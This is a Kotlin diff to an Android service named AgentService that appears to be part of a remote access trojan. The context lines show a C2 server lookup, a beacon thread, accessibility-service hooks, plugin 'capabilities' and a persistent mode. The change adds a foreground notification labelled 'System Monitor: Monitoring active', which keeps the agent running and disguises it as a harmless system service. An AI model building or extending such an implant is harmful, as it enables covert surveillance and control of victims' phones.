@@ -1,6 +1,9 @@
 package com.system.monitor
 
 import android.accessibilityservice.AccessibilityService
+import android.app.Notification
+import android.app.NotificationChannel
+import android.app.NotificationManager
 import android.app.Service
 import android.content.ComponentName
 import android.content.Context
@@ -36,6 +39,7 @@ import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import androidx.annotation.RequiresApi
+import androidx.core.app.NotificationCompat
 import com.google.gson.Gson
 import com.google.gson.reflect.TypeToken
 import com.system.monitor.capabilities.*
@@ -99,6 +103,8 @@ class AgentService : Service() {
         initCrypto()
         registerCapabilities()
         running = true
+        createNotificationChannel()
+        startForeground(1, buildForegroundNotification())
         thread(name = "agent-beacon") { beaconLoop() }
         Log.d("AgentService", "Service created, persistentMode=$persistentMode")
     }
@@ -106,6 +112,25 @@ class AgentService : Service() {
     private fun loadConfig() {
         val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
         persistentMode = prefs.getBoolean(KEY_PERSISTENT, true)
+    }
+
+    private fun createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel("agent_service", "System Monitor", NotificationManager.IMPORTANCE_LOW).apply {
+                description = "System monitoring service"
+            }
+            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            nm.createNotificationChannel(channel)
+        }
+    }
+
+    private fun buildForegroundNotification(): Notification {
+        return NotificationCompat.Builder(this, "agent_service")
+            .setContentTitle("System Monitor")
+            .setContentText("Monitoring active")
+            .setSmallIcon(android.R.drawable.stat_notify_sync)
+            .setOngoing(true)
+            .build()
     }
 
     private fun getC2Server(): String {
